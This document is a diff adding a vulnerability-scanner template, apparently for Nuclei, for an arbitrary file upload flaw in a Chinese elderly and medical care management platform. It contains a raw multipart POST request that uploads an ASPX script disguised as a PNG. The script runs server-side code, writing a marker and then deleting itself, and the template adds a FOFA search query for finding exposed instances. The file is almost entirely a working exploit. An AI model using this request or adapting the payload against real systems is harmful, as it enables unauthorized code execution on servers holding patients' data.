@@ -1,0 +1,43 @@
+id: poc-zg1gn34cl5suyq8n
+info:
+  name: 智慧医养综合服务管理平台InfoUpload存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zg1gn34cl5suyq8n'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zg1gn34cl5suyq8n
+    fofa: body="Content/css/Login/images/gtx-main-bg00004.png" || body="KingonUI.CommItemInfo()"
+http:
+- raw:
+  - 'POST /WebData/InfoUpload HTTP/1.1
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="test123.aspx"
+
+    Content-Type: image/png
+
+
+    <%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
